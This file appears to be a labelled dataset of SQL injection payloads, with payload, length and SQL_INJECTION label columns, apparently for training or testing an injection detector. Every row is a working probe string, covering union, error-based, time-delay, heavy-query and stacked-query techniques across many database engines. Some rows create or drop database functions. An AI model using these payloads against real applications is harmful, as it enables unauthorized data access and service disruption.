payload,length,label
"1' where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",221,SQL_INJECTION
1) as jmib where 8130=8130 rlike (select (case when (7885=3932) then 1 else 0x28 end))--,88,SQL_INJECTION
"-6086"" union all select 8700,8700,8700,8700--",45,SQL_INJECTION
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",122,SQL_INJECTION
"-9003"")) union all select 9721,9721--",37,SQL_INJECTION
1'))) waitfor delay '0:0:5' and ((('zhhf' like 'zhhf,52,SQL_INJECTION
"-2417) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",74,SQL_INJECTION
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('jvll' like 'jvll",228,SQL_INJECTION
"-8124) union all select 7251,7251,7251#",39,SQL_INJECTION
"1%')) union all select null,null,null--",39,SQL_INJECTION
"1'||(select 'rfjl' where 2476=2476 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",143,SQL_INJECTION
"-3546%"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",110,SQL_INJECTION
"1'||(select 'fdkl' where 4572=4572 union all select null,null,null,null,null,null,null,null,null#",97,SQL_INJECTION
1) where 9167=9167;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,127,SQL_INJECTION
"1' in boolean mode) union all select null,null,null,null,null,null,null#",72,SQL_INJECTION
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null,null--",88,SQL_INJECTION
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('qhgp'='qhgp",120,SQL_INJECTION
"1%'))) and make_set(1543=5817,5817) and ((('%'='",48,SQL_INJECTION
-2951 or 4189=2291,18,SQL_INJECTION
"-9606%""))) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",74,SQL_INJECTION
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)# dyed",99,SQL_INJECTION
1') and 6969=(select 6969 from pg_sleep(5)) and ('ayol'='ayol,61,SQL_INJECTION
"1')) as sojl where 8710=8710 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",137,SQL_INJECTION
"1' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",92,SQL_INJECTION
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""uqor"" like ""uqor",179,SQL_INJECTION
1') as gxfu where 9676=9676;select case when 5894=4052 then 1 else null end--,77,SQL_INJECTION
"1)) as qzmg where 4344=4344 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",119,SQL_INJECTION
"1) where 5385=5385 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",170,SQL_INJECTION
-1879%')) or 3038=3038,22,SQL_INJECTION
"1%' or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,SQL_INJECTION
"1%""));select pg_sleep(5) and ((""%""=""",36,SQL_INJECTION
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""vukd""=""vukd",158,SQL_INJECTION
"1 and elt(8853=1675,1675)-- jegm",32,SQL_INJECTION
"1"")) and 8594=(select 8594 from pg_sleep(5))--",46,SQL_INJECTION
"1) as zdym where 1578=1578 union all select null,null,null#",59,SQL_INJECTION
"1))) and make_set(8882=1593,1593) and (((7989=7989",50,SQL_INJECTION
"-9541) as bnky where 3934=3934 union all select 3934,3934,3934#",63,SQL_INJECTION
"1) where 9213=9213 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,SQL_INJECTION
1%')) and (select * from (select(sleep(5)))gcrr)#,49,SQL_INJECTION
"-8893%')) or elt(1032=1032,3623) and (('%'='",44,SQL_INJECTION
"1',(select (case when (7734=7734) then (select benchmark(5000000,md5(0x72747341))) else 7734*(select 7734 from mysql.db) end))",126,SQL_INJECTION
"1"") order by 1--",16,SQL_INJECTION
1'+(select 'wpnm' where 8223=8223 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',130,SQL_INJECTION
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'qvyq' like 'qvyq",179,SQL_INJECTION
"1%""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",96,SQL_INJECTION
"-3420 where 9681=9681 or make_set(2438=1977,1977)--",51,SQL_INJECTION
1));begin dbms_lock.sleep(5); end--,35,SQL_INJECTION
"1""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""vfoh""=""vfoh",129,SQL_INJECTION
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('qpuy'='qpuy",180,SQL_INJECTION
1'+(select 'jmdl' where 7827=7827;select pg_sleep(5))+',55,SQL_INJECTION
"-6292) union all select 7499,7499,7499,7499,7499,7499,7499--",60,SQL_INJECTION
1')) or (select * from (select(sleep(5)))sddo)#,47,SQL_INJECTION
"1"") where 7578=7578 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",127,SQL_INJECTION
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",97,SQL_INJECTION
1') as pxcd where 9754=9754 or sleep(5)--,41,SQL_INJECTION
"1'+(select ounb where 4653=4653 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'",136,SQL_INJECTION
"-1483' or make_set(9354=9354,7185) and 'qfil'='qfil",51,SQL_INJECTION
"1') where 1027=1027 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",192,SQL_INJECTION
1') where 5287=5287 and 7533=7533--,35,SQL_INJECTION
"1%"" and (select * from (select(sleep(5)))gcrr)#",47,SQL_INJECTION
"1%"") and (6016=4763)*4763 and (""%""=""",36,SQL_INJECTION
"-6667%"")) union all select 7348,7348,7348,7348,7348,7348,7348,7348#",67,SQL_INJECTION
"1"") where 2922=2922 or elt(6272=6272,sleep(5))--",48,SQL_INJECTION
"-9588')) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",77,SQL_INJECTION
"1) where 5073=5073 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",159,SQL_INJECTION
"1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('pqxe' like 'pqxe",198,SQL_INJECTION
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)-- ofqd",210,SQL_INJECTION
-3339' or 8571=8571--,21,SQL_INJECTION
"1' where 2690=2690;select count(*) from generate_series(1,5000000)--",68,SQL_INJECTION
"1"") where 4964=4964;(select * from (select(sleep(5)))srmq)--",60,SQL_INJECTION
"1' where 9420=9420 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,SQL_INJECTION
"1"")) as wssb where 5772=5772;select (case when (7852=7476) then 7852 else 7852*(select 7852 from mysql.db) end)#",112,SQL_INJECTION
"1'+(select 'ejox' where 2719=2719 union all select null,null,null#",66,SQL_INJECTION
"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",198,SQL_INJECTION
"1"")) and 2006=2006",18,SQL_INJECTION
"1%"")) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",143,SQL_INJECTION
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""xmvr""=""xmvr",220,SQL_INJECTION
1'||(select 'ywfo' from dual where 4168=4168 rlike sleep(5)#,60,SQL_INJECTION
"-7528' or make_set(3809=1821,1821) and 'kgch'='kgch",51,SQL_INJECTION
"-2384%')) union all select 2467,2467,2467,2467#",47,SQL_INJECTION
"-9772' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'igaa'='igaa",218,SQL_INJECTION
"1%')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('%'='",121,SQL_INJECTION
"1%"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""%""=""",105,SQL_INJECTION
-1188)) union all select 4711--,31,SQL_INJECTION
"-8319"")) or 7878=5970 and ((""jcaz"" like ""jcaz",45,SQL_INJECTION
"1) as tjwa where 1173=1173 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",117,SQL_INJECTION
"1""))) and 8594=(select 8594 from pg_sleep(5))--",47,SQL_INJECTION
"1""))) and 2388=benchmark(5000000,md5(0x6d457153))#",50,SQL_INJECTION
1'+(select sijr where 7250=7250;if(1665=3845) select 1665 else drop function nzod--,83,SQL_INJECTION
"1'||(select 'epjr' from dual where 3074=3074 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",135,SQL_INJECTION
1'||(select 'vuku' where 3143=3143 waitfor delay '0:0:5'--,58,SQL_INJECTION
"-4905"" union all select 6082,6082--",35,SQL_INJECTION
"1%""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""%""=""",220,SQL_INJECTION
1'+(select 'rsgi' where 2258=2258;(select * from (select(sleep(5)))srmq))+',75,SQL_INJECTION
-2658) as casi where 7364=7364 or 8245=9651--,45,SQL_INJECTION
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",117,SQL_INJECTION
"1"") as uyms where 6210=6210 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",225,SQL_INJECTION
1;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,66,SQL_INJECTION
"-4686"") as dxks where 7123=7123 or elt(1032=1032,3623)--",56,SQL_INJECTION
1')) rlike (select (case when (3876=2077) then 1 else 0x28 end)) and (('hqcz' like 'hqcz,88,SQL_INJECTION
"1'||(select 'zdfo' from dual where 4288=4288 union all select null,null,null,null,null,null,null--",98,SQL_INJECTION
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",88,SQL_INJECTION
1' and (3423=7789)*7789 and 'pdia' like 'pdia,45,SQL_INJECTION
"1' and elt(4249=4249,7259)",26,SQL_INJECTION
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('gmil'='gmil",117,SQL_INJECTION
1'||(select 'ptkj' from dual where 6263=6263 union all select null--,68,SQL_INJECTION
"1"") where 9855=9855;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",128,SQL_INJECTION
"1,(select (case when (7711=7711) then 1 else 7711*(select 7711 from information_schema.character_sets) end))",108,SQL_INJECTION
"1'+(select kzgg where 5070=5070;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",116,SQL_INJECTION
"1') as tvqn where 2967=2967;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",124,SQL_INJECTION
"1%' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and '%'='",87,SQL_INJECTION
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('dhqz'='dhqz",122,SQL_INJECTION
"1%' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and '%'='",169,SQL_INJECTION
-1549') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('fnwx'='fnwx,256,SQL_INJECTION
"1))) and 2388=benchmark(5000000,md5(0x6d457153))#",49,SQL_INJECTION
"-2423'))) union all select 8256,8256,8256,8256,8256,8256,8256,8256--",68,SQL_INJECTION
"1)) as rwsn where 9946=9946 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",118,SQL_INJECTION
"-6680%"")) union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",73,SQL_INJECTION
"1%') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",156,SQL_INJECTION
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('pufu' like 'pufu",89,SQL_INJECTION
"1'||(select 'tezo' from dual where 4436=4436;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",107,SQL_INJECTION
"1'))) or elt(6272=6272,sleep(5)) and ((('ayjb' like 'ayjb",57,SQL_INJECTION
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gmvk' like 'gmvk",181,SQL_INJECTION
"-2639"") where 1494=1494 union all select 1494--",47,SQL_INJECTION
1') as fyib where 9246=9246;select (case when (5085=4259) then 5085 else 5085*(select 5085 from mysql.db) end)#,111,SQL_INJECTION
1) as tngy where 8956=8956 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,88,SQL_INJECTION
"1"") where 2278=2278;if(7899=7899) select 7899 else drop function zbbp--",71,SQL_INJECTION
"1"")) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""vcjt"" like ""vcjt",167,SQL_INJECTION
1) as zzip where 5353=5353 and 3394=3092,40,SQL_INJECTION
"1"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#",48,SQL_INJECTION
"1"") where 2152=2152;select pg_sleep(5)--",40,SQL_INJECTION
"1') as wpom where 2620=2620 and elt(3114=3114,sleep(5))#",56,SQL_INJECTION
"-3819'))) union all select 9014,9014,9014,9014,9014,9014--",58,SQL_INJECTION
"1%"") and elt(1210=1210,sleep(5)) and (""%""=""",43,SQL_INJECTION
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('knhm'='knhm",111,SQL_INJECTION
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",118,SQL_INJECTION
"1"") or 8514=benchmark(5000000,md5(0x544d5a4c))#",47,SQL_INJECTION
-8086%') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',217,SQL_INJECTION
-4947' order by 1#,18,SQL_INJECTION
"1%"" union all select null,null,null,null,null,null,null,null#",61,SQL_INJECTION
"1%'));select count(*) from generate_series(1,5000000)--",55,SQL_INJECTION
"-5798"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",201,SQL_INJECTION
"1%"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",211,SQL_INJECTION
"1%""))) and 9198=9198--",22,SQL_INJECTION
"-4418"" or 6872=6872 and ""gbut""=""gbut",36,SQL_INJECTION
1'||(select 'ytwz' from dual where 3025=3025 and (5039=5303)*5303)||',69,SQL_INJECTION
"iif(1539=1539,1539,1/0)",23,SQL_INJECTION
"1%""))) rlike sleep(5)#",22,SQL_INJECTION
"-5198))) union all select 7089,7089,7089,7089,7089,7089,7089,7089#",66,SQL_INJECTION
"1));select benchmark(5000000,md5(0x714e4153))#",46,SQL_INJECTION
"1 where 4091=4091;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",102,SQL_INJECTION
"1"") as cnrh where 8524=8524 and 3824=benchmark(5000000,md5(0x76555642))--",73,SQL_INJECTION
"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",74,SQL_INJECTION
1') where 1369=1369 and 4840=1697#,34,SQL_INJECTION
"-8609%""))) union all select 6021,6021,6021,6021,6021,6021--",59,SQL_INJECTION
"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykoz'='ykoz",128,SQL_INJECTION
"1',(select (case when (1902=5536) then 1 else 1902*(select 1902 from master..sysdatabases) end))",96,SQL_INJECTION
"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""wmmg"" like ""wmmg",85,SQL_INJECTION
1') rlike (select * from (select(sleep(5)))sgvo),48,SQL_INJECTION
"1') as tsge where 6970=6970;select count(*) from generate_series(1,5000000)--",77,SQL_INJECTION
"1' where 4945=4945;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",119,SQL_INJECTION
"1"" union all select null,null,null,null,null,null,null,null,null,null--",71,SQL_INJECTION
"-8046""))) union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",72,SQL_INJECTION
"1%"")) and 2388=benchmark(5000000,md5(0x6d457153))#",50,SQL_INJECTION
"-9959"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""vcwc""=""vcwc",227,SQL_INJECTION
5739-5738,9,SQL_INJECTION
-9653') where 2705=2705 or 9323=9323#,37,SQL_INJECTION
"1))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((1402=1402",216,SQL_INJECTION
